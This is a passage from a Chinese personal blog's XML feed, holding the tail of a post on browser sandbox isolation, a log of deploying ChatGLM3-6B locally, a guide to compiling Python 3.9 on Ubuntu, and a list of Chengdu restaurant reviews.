等与浏览器进程严格隔离，因此不会互相影响。</p><p>渲染引擎由Sandbox隔离，网页代码要与浏览器内核进程或操作系统进行通信都需要通过IPC channel，在其中会进行一些安全检查。</p><p>Sandbox（沙箱）：</p><ul><li><p>原理：Sandbox 的设计目的是为了<strong>让不可信任的代码运行在一定的环境中，限制不可信任的代码访问隔离区之外的资源。<strong>如果</strong>一定要跨越Sandbox边界产生数据交换，则只能通过指定的数据通道，比如经过封装的API来完成，在这些API中会严格检查请求的合法性</strong>。</p></li><li><p>应用实例：比如一个提供 hosting服务的共享主机环境，假设支持用户上传PHP、Python、Java等语言的代码，为了防止用户代码破坏系统环境，或者是不同用户之间的代码互相影响，则应该设计一个 Sandbox对用户代码进行隔离。Sandbox需要考虑用户代码针对本地文件系统、内存、数据库、网络的可能请求，可以采用默认拒绝的策略，对于有需要的请求，则可以通过封装API的方式实现。</p></li></ul><p>浏览器所加载的一些第三方插件往往不收sandbox管辖，近年来大部分的浏览器漏洞都是<strong>加载第三方插件</strong>导致的。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.cnblogs.com/zhengna/p/11428822.html">https://www.cnblogs.com/zhengna/p/11428822.html</a></li><li><a href="https://blog.csdn.net/t0410ch/article/details/125150202">https://blog.csdn.net/t0410ch/article/details/125150202</a></li><li><a href="https://blog.csdn.net/u012861467/article/details/79530629">https://blog.csdn.net/u012861467/article/details/79530629</a></li><li><a href="https://cloud.tencent.com/developer/article/1878652">https://cloud.tencent.com/developer/article/1878652</a></li><li><a href="https://www.cnblogs.com/edisonchou/p/edc_web_security_foundation_notes.html">https://www.cnblogs.com/edisonchou/p/edc_web_security_foundation_notes.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/348948397">https://zhuanlan.zhihu.com/p/348948397</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器安全 </tag>
            
            <tag> 客户端脚本安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『大模型』本地部署chatglm3-6b</title>
      <link href="/posts/d5ac.html"/>
      <url>/posts/d5ac.html</url>
      
        <content type="html"><![CDATA[<h1 id="motivation"><a href="#motivation" class="headerlink" title="motivation"></a>motivation</h1><p>ChatGLM3-6B发布于2023年10月27日，是目前中文能力排名最高的开源LLM模型。对应项目的github地址：<a href="https://github.com/THUDM/ChatGLM3">https://github.com/THUDM/ChatGLM3</a></p><p>实验室项目中需要本地部署大模型用于新闻文本摘要任务，因为预测速度的要求及硬件条件的限制，比较后选择该模型的6B版本。</p><p>本文为在linux环境下的chatglm3-6b的本地部署工程记录。</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="CUDA与CUDNN"><a href="#CUDA与CUDNN" class="headerlink" title="CUDA与CUDNN"></a>CUDA与CUDNN</h2><p>深度学习任务中，当使用GPU进行训练的时候，需要安装英伟达提供的驱动和显卡对应的cuda、cudnn。</p><h3 id="什么是cuda和cudnn？"><a href="#什么是cuda和cudnn？" class="headerlink" title="什么是cuda和cudnn？"></a>什么是cuda和cudnn？</h3><ul><li>CUDA(ComputeUnified Device Architecture)：是一种由NVIDIA推出的通用并行计算架构，该架构使GPU能够解决复杂的计算问题。</li><li>CUDNN：是用于深度神经网络的GPU加速库。它强调性能、易用性和低内存开销。NVIDIA cuDNN可以集成到更高级别的机器学习框架中，如谷歌的Tensorflow、torch</li></ul><p>需要注意的是，cuda、cudnn和我们常用的深度学习框架（如tensorflow-gpu、torch-gpu）之间的版本存在对应关系，如果配置错误则代码不能运行。</p><p>我们首先查看服务器上的显卡相关信息，在命令行输入：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi</span><br></pre></td></tr></table></figure><p>可以看到显卡支持的最高CUDA版本为11.8（<strong>注意这里是显卡支持的最高CUDA版本，而并不是目前系统安装的CUDA版本</strong>！）</p><p>同时可以看到这台服务器上装载了两个显存大小都为24G的GPU 0和1，其中GPU 0的显存几乎已经完全占满。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122191115501.png" alt="image-20240122191115501"></p><p>输入以下命令，查看是否已经安装了cuda：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvcc -V</span><br></pre></td></tr></table></figure><p>如果出现 <code>Command &#39;nvcc&#39; not found, but can be installed with:</code> 的输出，说明该服务器的系统并没有安装cuda</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122193539449.png" alt="image-20240122193539449"></p><p>可以看到我这台服务器上面已经安装了cuda，版本为11.8，所以并不需要进行cuda和cudnn的安装</p><p><strong>如果你和我一样已经安装了cuda和cudnn，请跳转到下一部分，进行相对应torch-gpu的安装</strong></p><h3 id="cuda和cudnn的安装"><a href="#cuda和cudnn的安装" class="headerlink" title="cuda和cudnn的安装"></a>cuda和cudnn的安装</h3><p>这一部分我并没有进行，考虑后续有没有机会补上。</p><p>首先要创建一个Python ≥ 3.10的虚拟环境（chatglm3-6b要求）。</p><p>要注意虚拟环境中的cuda和系统中的cuda的区别，我这里的cuda就是直接安装在系统中，所有的虚拟环境都可以使用系统中安装的cuda</p><p>在虚拟环境中安装并使用其他版本的cuda，参考：<a href="https://blog.csdn.net/2301_80501457/article/details/134191613">https://blog.csdn.net/2301_80501457/article/details/134191613</a></p><blockquote><p>要注意：如果你的cuda是直接安装在虚拟环境中，并非直接安装在系统中。是无法使用ncvv -V命令验证是否安装成功的，ncvv -V是通过系统变量来直接查询，而安装在虚拟环境中并没有直接建立系统变量。验证方法可以见上面链接的最后一部分。</p></blockquote><h2 id="pytorch-gpu的安装"><a href="#pytorch-gpu的安装" class="headerlink" title="pytorch-gpu的安装"></a>pytorch-gpu的安装</h2><p>pytorch-gpu的版本同样必须依赖于CUDA的版本。</p><p>注意，<code>conda install pytorch</code> 命令安装的是torch CPU版本，但是我们要使用GPU进行训练</p><p>在<a href="https://pytorch.org/get-started/previous-versions/">pytorch官网</a>上获取cuda11.8对应版本torch的安装命令</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122103348292.png" alt="image-20240122103348292"></p><p>复制对应的命令，执行安装</p><p>安装完成后编写程序如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch <span class="comment"># 如果pytorch安装成功即可导入</span></span><br><span class="line"><span class="built_in">print</span>(torch.cuda.is_available()) <span class="comment"># 查看CUDA是否可用</span></span><br><span class="line"><span class="built_in">print</span>(torch.cuda.device_count()) <span class="comment"># 查看可用的CUDA数量</span></span><br><span class="line"><span class="built_in">print</span>(torch.version.cuda) <span class="comment"># 查看CUDA版本</span></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122195902702.png" alt="image-20240122195902702"></p><p>已经配置成功</p><h2 id="安装剩余依赖"><a href="#安装剩余依赖" class="headerlink" title="安装剩余依赖"></a>安装剩余依赖</h2><p>clone下来ChatGLM3项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/THUDM/ChatGLM3.git</span><br></pre></td></tr></table></figure><blockquote><p>超时的话挂梯子设置代理，使用服务器没办法挂梯子的话直接在github下载zip上传到服务器上</p></blockquote><p>由于已经安装了torch，所以我们要<strong>删掉项目目录下requirements.txt中的 <em>torch&gt;&#x3D;2.1.0</em> 一行</strong></p><p>并使用 pip 安装剩余的依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><blockquote><p>这里一定要删除torch相关依赖行！！不然会自动给你下载冲突的torch版本，后续项目报错</p></blockquote><h1 id="下载ChatGLM3-6b模型及参数"><a href="#下载ChatGLM3-6b模型及参数" class="headerlink" title="下载ChatGLM3-6b模型及参数"></a>下载ChatGLM3-6b模型及参数</h1><h2 id="方法1：从-Hugging-Face-Hub-下载模型"><a href="#方法1：从-Hugging-Face-Hub-下载模型" class="headerlink" title="方法1：从 Hugging Face Hub 下载模型"></a>方法1：从 Hugging Face Hub 下载模型</h2><p>首先需要安装Git LFS，否则会出现模型中的大型文件下载不完整的情况。</p><p>输入以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git lfs install</span><br></pre></td></tr></table></figure><p>若显示 <code>Git LFS initialized</code> ，说明已经安装。</p><p>可以使用git进行克隆，运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://huggingface.co/THUDM/chatglm3-6b</span><br></pre></td></tr></table></figure><p>如果下载比较慢或者超时，可以直接去<a href="https://huggingface.co/THUDM/chatglm3-6b">官网</a>下载模型再上传到服务器</p><h2 id="方法2：从-ModelScope-下载模型（推荐）"><a href="#方法2：从-ModelScope-下载模型（推荐）" class="headerlink" title="方法2：从 ModelScope 下载模型（推荐）"></a>方法2：从 ModelScope 下载模型（推荐）</h2><p>同样也可以在国内魔搭社区下载，一般不会超时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git lfs install</span><br><span class="line">git clone https://www.modelscope.cn/ZhipuAI/chatglm3-6b.git</span><br></pre></td></tr></table></figure><blockquote><p>注意，这里一定要<code>git lfs install</code>，虽然我查了这个命令仅仅只是用于验证是否安装了git lfs，但是我第一次从魔搭git clone的时候，没有使用这个命令产生了大文件下载不完整的情况，加上后没有再出现这样的问题，所以建议还是加上吧。</p></blockquote><h1 id="代码调用模型进行预测"><a href="#代码调用模型进行预测" class="headerlink" title="代码调用模型进行预测"></a>代码调用模型进行预测</h1><p>下载完成模型及参数文件后，我们将所有的文件放在一个文件夹<code>chatglm3-6b</code>里，然后将其放在项目文件夹ChatGLM3-main下</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122202232999.png" alt="image-20240122202232999"></p><p>然后我们可以在项目主目录下创建test.py文件，通过如下代码调用 ChatGLM 模型来生成对话：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, AutoModel</span><br><span class="line"></span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(<span class="string">&quot;chatglm3-6b/&quot;</span>, trust_remote_code=<span class="literal">True</span>)</span><br><span class="line">model = AutoModel.from_pretrained(<span class="string">&quot;chatglm3-6b/&quot;</span>, trust_remote_code=<span class="literal">True</span>, device=<span class="string">&#x27;cuda&#x27;</span>)</span><br><span class="line">model = model.<span class="built_in">eval</span>()</span><br><span class="line">response, history = model.chat(tokenizer, <span class="string">&quot;你好&quot;</span>, history=[])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;回答：&quot;</span>,response)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要根据上下文的情况下</span></span><br><span class="line"><span class="comment"># response, history = model.chat(tokenizer, &quot;晚上睡不着应该怎么办&quot;, history=history)</span></span><br><span class="line"><span class="comment"># print(response)</span></span><br></pre></td></tr></table></figure><blockquote><p>这里使用”chatglm3-6b&#x2F;“就是加载了该文件夹下的本地模型及文件</p></blockquote><p>在命令行输入，执行代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CUDA_VISIBLE_DEVICES=1 python test.py</span><br></pre></td></tr></table></figure><blockquote><p>注意，这里的 <code>CUDA_VISIBLE_DEVICES=1</code> 的作用是指定使用 GPU 1 来跑模型，因为我们前面已经通过 <code>nvidia-smi</code> 知道 GPU 0 的显存已经基本占满了</p><p>cuda指定GPU、设置多GPU的方法：<a href="https://blog.csdn.net/OneQuestionADay/article/details/111691486">https://blog.csdn.net/OneQuestionADay/article/details/111691486</a></p></blockquote><h1 id="构建网页版demo"><a href="#构建网页版demo" class="headerlink" title="构建网页版demo"></a>构建网页版demo</h1><p>官方教程：<a href="https://github.com/THUDM/ChatGLM3/blob/main/composite_demo/README.md">https://github.com/THUDM/ChatGLM3/blob/main/composite_demo/README.md</a></p><p>安装 Jupyter 内核：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipython kernel install --name chatglm3-demo --user</span><br></pre></td></tr></table></figure><p>因为我们是本地下载的模型，所以需要先设置环境变量 <code>MODEL_PATH</code> 来指定从本地加载模型</p><p>直接在终端中输入如下命令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export MODEL_PATH=//home/xjb/event/ChatGLM3-main/chatglm3-6b</span><br></pre></td></tr></table></figure><p>然后输入命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CUDA_VISIBLE_DEVICES=1 streamlit run composite_demo/main.py</span><br></pre></td></tr></table></figure><blockquote><p>注意这里一样要在命令的前面加上 <code>CUDA_VISIBLE_DEVICES=1</code> 来设置使用的GPU</p></blockquote><p>运行结果：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122204008879.png" alt="image-20240122204008879"></p><p>如果你部署在了服务器上而不是本机，访问对应的network url既可使用网页demo</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122204313569.png" alt="image-20240122204313569"></p><p>现在你就拥有一个属于自己的本地大模型啦，因为该模型较轻量级，预测的速度还是比较快的，在未经过微调的情况下我直接将其用于新闻文本的摘要任务，大概1-2秒可以生成一篇文本的摘要，效果也比较不错，但是偶尔会出现中英文乱码的情况。</p><p>你也可以对其进行进一步的领域微调，使其更适合你的任务。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><p><a href="https://blog.csdn.net/qq_43705697/article/details/121618276">https://blog.csdn.net/qq_43705697/article/details/121618276</a></p></li><li><p><a href="https://blog.csdn.net/2301_80501457/article/details/134191613">https://blog.csdn.net/2301_80501457/article/details/134191613</a></p></li><li><p><a href="https://blog.csdn.net/m0_65814643/article/details/134510135?spm=1001.2014.3001.5501">https://blog.csdn.net/m0_65814643/article/details/134510135?spm=1001.2014.3001.5501</a></p></li><li><p><a href="https://blog.csdn.net/m0_65814643/article/details/134563092">https://blog.csdn.net/m0_65814643/article/details/134563092</a></p></li><li><p><a href="https://blog.csdn.net/OneQuestionADay/article/details/111691486">https://blog.csdn.net/OneQuestionADay/article/details/111691486</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工程记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大模型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『linux』ubuntu修改python版本</title>
      <link href="/posts/3bee.html"/>
      <url>/posts/3bee.html</url>
      
        <content type="html"><![CDATA[<p><strong>motivation：</strong></p><p>服务器系统为：ubuntu20.04</p><p>查看系统中自带的python版本，可以发现系统自带的python3版本为python3.8。</p><p>因为我们需要在服务器部署的项目依赖python版本&gt;&#x3D;3.9，与Python3.8不兼容，所以需要安装python3.9。</p><p>本文详细记录在Ubuntu20.04（其他版本步骤也一样）上编译安装指定版本Python解释器的过程和可能遇到的问题，及多个Python版本并存的使用方法。</p><h1 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h1><p>初次安装的时候，没有执行这个步骤，后续踩了比较多的坑，参考网上的文章后执行此步骤可以解决大部分的问题。</p><h2 id="更新系统软件"><a href="#更新系统软件" class="headerlink" title="更新系统软件"></a>更新系统软件</h2><p>在正式开始之前，建议首先检查系统软件是否均为最新，并更新到最新版本。</p><p>打开一个终端，输入以下命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 刷新软件包目录</span><br><span class="line">sudo apt update</span><br><span class="line"># 列出当前可用的更新</span><br><span class="line">sudo apt list --upgradable</span><br><span class="line"># 如上一步提示有可以更新的项目，则执行更新</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111170901524.png" alt="image-20240111170901524"></p><h2 id="安装GCC编译器"><a href="#安装GCC编译器" class="headerlink" title="安装GCC编译器"></a>安装GCC编译器</h2><p>打开一个终端，使用 apt 安装 GCC 编译器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 GCC 编译器</span></span><br><span class="line">sudo apt install gcc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查安装是否成功</span></span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># 若显示出 GCC 版本则成功</span></span><br></pre></td></tr></table></figure><h2 id="安装其他依赖"><a href="#安装其他依赖" class="headerlink" title="安装其他依赖"></a>安装其他依赖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 刷新软件包目录</span></span><br><span class="line">sudo apt update</span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">sudo apt install build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev libbz2-dev liblzma-dev sqlite3 libsqlite3-dev tk-dev uuid-dev libgdbm-compat-dev</span><br></pre></td></tr></table></figure><p>注意，Python 的部分功能依赖于对应的库（如 OpenSSL、SQLite3、LZMA 等），如果在编译时未能找到这些库，仍然可能完成编译。此时的 Python 解释器看似可以工作，但在需要使用特定功能时就会出问题。例如 OpenSSL 出现问题会导致无法正常使用 pip。故建议按本节提示安装所有可选依赖项。</p><h1 id="查看系统自带python3版本"><a href="#查看系统自带python3版本" class="headerlink" title="查看系统自带python3版本"></a>查看系统自带python3版本</h1><p>在系统终端中输入：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /usr/bin | grep python</span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111165216118.png" alt="image-20240111165216118"></p><p>可以看出使用系统的Python3指向版本python3.8</p><p>输入python3 –version可以查看详细版本信息</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111165421131.png" alt="image-20240111165421131"></p><h1 id="下载安装python3-9"><a href="#下载安装python3-9" class="headerlink" title="下载安装python3.9"></a>下载安装python3.9</h1><h2 id="下载与解压"><a href="#下载与解压" class="headerlink" title="下载与解压"></a>下载与解压</h2><p>在<a href="https://www.python.org/ftp/python/%E4%B8%8B%E6%89%BE%E5%88%B0%E6%88%91%E4%BB%AC%E6%83%B3%E8%A6%81%E5%AE%89%E8%A3%85%E7%9A%84python3.9%E7%89%88%E6%9C%AC%E7%9A%84tgz%E5%AE%89%E8%A3%85%E5%8C%85">https://www.python.org/ftp/python/下找到我们想要安装的python3.9版本的tgz安装包</a></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111165757616.png" alt="image-20240111165757616"></p><p>在终端中通过wget命令下载我们选择的安装包</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget https://www.python.org/ftp/python/<span class="number">3</span>.<span class="number">9</span>.<span class="number">0</span>/Python-<span class="number">3</span>.<span class="number">9</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure><p>解压安装包并进入目录（我这里选择解压到根目录下，读者可以自行选择解压路径）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -zxvf Python-<span class="number">3</span>.<span class="number">9</span>.<span class="number">0</span>.tgz -C ~</span><br><span class="line"><span class="built_in">cd</span> Python-<span class="number">3</span>.<span class="number">8</span>.<span class="number">5</span></span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>在Python-3.8.5目录下：</p><p>配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./configure</span><br></pre></td></tr></table></figure><p>编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure><p>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make altinstall</span><br></pre></td></tr></table></figure><blockquote><p>这里使用应使用 <code>altinstall</code> 而不是 <code>install</code> 。</p><p>二者的一个重要区别在于，后者会创建符号链接，将 <code>python3</code> 等命令链接到正在安装的新版本 Python 3 上，这可能会破坏系统。更多信息请参阅当前目录下的 <code>README.rst</code> 文件。</p></blockquote><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><strong>有的文章可能会在这里让你删除掉原有的python环境或者是修改python3命令指向新安装的python3.8环境，由于 Ubuntu 系统、安装的其他软件等很可能会依赖于系统原有的python环境等原因，都不要进行此类修改！！！</strong></p><p>下面对安装完成的python环境进行测试</p><p>在命令行输入python3.9（注意不要分开），可以看到已经成功安装了。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111172737068.png" alt="image-20240111172737068"></p><p>如果要在python3.9环境下安装库的话，使用pip3.9即可</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111173117603.png" alt="image-20240111173117603"></p><p>后续如果想用python3.9环境来执行代码的话，在前面加上python3.9即可</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111173227176.png" alt="image-20240111173227176"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://zhuanlan.zhihu.com/p/506491209">https://zhuanlan.zhihu.com/p/506491209</a></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> unbuntu </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『探店』成都探店</title>
      <link href="/posts/1e32.html"/>
      <url>/posts/1e32.html</url>
      
        <content type="html"><![CDATA[<p>在成都求学的这几年间吃过的一些比较好吃的店铺。</p><h1 id="川菜"><a href="#川菜" class="headerlink" title="川菜"></a>川菜</h1><h2 id="鸡毛店"><a href="#鸡毛店" class="headerlink" title="鸡毛店"></a>鸡毛店</h2><ul><li><p>地点：天府宏</p></li><li><p>人均：50</p></li><li><p>评价：去过好几次了，味道很不错，注意有的店也叫鸡毛店但不一样，我一般常去天府宏的</p></li><li><p>推荐菜：</p><ul><li><p>蒜蓉生焖虾：必点，非常好吃</p></li><li><p>鸡丝凉面</p></li></ul></li></ul><h2 id="明婷饭店"><a href="#明婷饭店" class="headerlink" title="明婷饭店"></a>明婷饭店</h2><ul><li>地点：去过两个分店，都还可以</li><li>人均：60</li><li>评价：便宜，味道很不错，性价比高。</li><li>推荐菜：<ul><li>脑花豆腐：必点，特别下饭</li><li>奇香排骨：招牌</li></ul></li></ul><h2 id="陈麻婆豆腐"><a href="#陈麻婆豆腐" class="headerlink" title="陈麻婆豆腐"></a>陈麻婆豆腐</h2><ul><li>地点：总店在杜甫草堂对面</li><li>人均：60</li><li>评价：麻婆豆腐非常好吃，其他菜一般般。建议去总店！</li><li>推荐菜：<ul><li>麻婆豆腐，非遗</li></ul></li></ul><h2 id="永乐饭店"><a href="#永乐饭店" class="headerlink" title="永乐饭店"></a>永乐饭店</h2><ul><li>地点：武侯区</li><li>人均：50</li><li>评价：便宜好吃，网上评价都比较好，暂时没吃过</li><li>推荐菜：<ul><li>照着招牌点就行</li></ul></li></ul><h1 id="翘脚牛肉"><a href="#翘脚牛肉" class="headerlink" title="翘脚牛肉"></a>翘脚牛肉</h1><h2 id="冯四嬢翘脚牛肉"><a href="#冯四嬢翘脚牛肉" class="headerlink" title="冯四嬢翘脚牛肉"></a>冯四嬢翘脚牛肉</h2><ul><li>地点：世豪广场</li><li>人均：30</li><li>评价：价格比较便宜，牛肉很新鲜。</li><li>推荐菜：<ul><li>翘脚牛肉</li><li>鲜血旺</li><li>粉蒸牛肉</li></ul></li></ul><h1 id="烧烤"><a href="#烧烤" class="headerlink" title="烧烤"></a>烧烤</h1><h2 id="新奥尔良烧烤"><a href="#新奥尔良烧烤" class="headerlink" title="新奥尔良烧烤"></a>新奥尔良烧烤</h2><ul><li>地点：这家店地图上搜不到，可以搜索玉林西路的生火火地摊小炉子烧烤，在对面</li><li>人均：60</li><li>评价：烤翅神中神，其他的也不错</li><li>推荐菜：<ul><li>烤翅</li><li>让老板娘帮着拿，都不错</li></ul></li></ul><h1 id="美蛙鱼"><a href="#美蛙鱼" class="headerlink" title="美蛙鱼"></a>美蛙鱼</h1><h2 id="蓉城霜霜"><a href="#蓉城霜霜" class="headerlink" title="蓉城霜霜"></a>蓉城霜霜</h2><ul><li>地点：连锁店，哪里都有</li><li>人均：60</li><li>评价：自助，吃美蛙鱼就去这</li></ul><h1 id="冒烤鸭"><a href="#冒烤鸭" class="headerlink" title="冒烤鸭"></a>冒烤鸭</h1><h2 id="回味冒烤鸭"><a href="#回味冒烤鸭" class="headerlink" title="回味冒烤鸭"></a>回味冒烤鸭</h2><ul><li>地点：回味冒烤鸭（川大店）</li><li>人均：20</li><li>评价：价格便宜，好吃</li></ul><h1 id="火锅"><a href="#火锅" class="headerlink" title="火锅"></a>火锅</h1><p>感觉火锅味道都差不多？</p><h2 id="矮板凳"><a href="#矮板凳" class="headerlink" title="矮板凳"></a>矮板凳</h2><ul><li>地点：连锁，哪里都有</li><li>人均：70</li><li>评价：实验室聚餐去吃过几次，味道还可以，价格也还行</li></ul><h2 id="星鸿社"><a href="#星鸿社" class="headerlink" title="星鸿社"></a>星鸿社</h2><ul><li>地点：建设路&#x2F;电子科技大学</li><li>人均：100+</li><li>评价：一家重庆老火锅，味道很好，但是价格比较贵。</li></ul><h1 id="串串"><a href="#串串" class="headerlink" title="串串"></a>串串</h1><h2 id="六年二班串串"><a href="#六年二班串串" class="headerlink" title="六年二班串串"></a>六年二班串串</h2><ul><li><p>地点：人民公园店</p></li><li><p>人均：40</p></li><li><p>评价：成都朋友推荐，还没去过。</p></li></ul><h1 id="小龙虾"><a href="#小龙虾" class="headerlink" title="小龙虾"></a>小龙虾</h1><h2 id="龙虾一绝"><a href="#龙虾一绝" class="headerlink" title="龙虾一绝"></a>龙虾一绝</h2><ul><li>地点：玉林西路</li><li>人均：70</li><li>评价：本地人舍友推荐的一家龙虾店，去吃过一次，价格较贵，感觉一般般，也有可能是我点的是微辣的原因。</li></ul><h1 id="小吃"><a href="#小吃" class="headerlink" title="小吃"></a>小吃</h1><h2 id="建设北路"><a href="#建设北路" class="headerlink" title="建设北路"></a>建设北路</h2><ul><li><p>烤苕皮</p></li><li><p>油条糯米糍（不叫这个，具体叫啥忘了）：个人觉得非常好吃，每次去都买一个肉松味的。</p></li><li><p>冰粉：一般吃火锅买一个。</p></li><li><p>冰豆花</p></li><li><p>蛋烘糕</p></li><li><p>成都市很好吃的火锅粉：推荐脑花、火锅粉。</p></li><li><p>钵钵鸡</p></li><li><p>担担面</p></li></ul><h2 id="宽菜日记"><a href="#宽菜日记" class="headerlink" title="宽菜日记"></a>宽菜日记</h2><ul><li>推荐菜：<ul><li>甜皮鸭：建议买来后1-2小时内吃，放久了就不好吃了。</li></ul></li></ul><h2 id="蹄花"><a href="#蹄花" class="headerlink" title="蹄花"></a>蹄花</h2><ul><li><p>吴氏蹄花：川大望江校区附近，便宜好吃，推荐雪豆蹄花汤+铁板烧。</p></li><li><p>无名蹄花：大众点评必吃榜上的，暂时没吃过。</p></li></ul><h1 id="不推荐"><a href="#不推荐" class="headerlink" title="不推荐"></a>不推荐</h1><h2 id="陶德砂锅"><a href="#陶德砂锅" class="headerlink" title="陶德砂锅"></a>陶德砂锅</h2><p>网红店。很一般，本地人都不推荐的店</p><h2 id="烤匠"><a href="#烤匠" class="headerlink" title="烤匠"></a>烤匠</h2><p>本人去过好几次，感觉也是比较一般，而且偏贵，推荐菜：芝士烤红薯</p><h2 id="冒椒火辣"><a href="#冒椒火辣" class="headerlink" title="冒椒火辣"></a>冒椒火辣</h2><p>网红店。小菜很好吃（脑花好吃），但是串串感觉味道很一般，偏贵</p><h2 id="饕林餐厅"><a href="#饕林餐厅" class="headerlink" 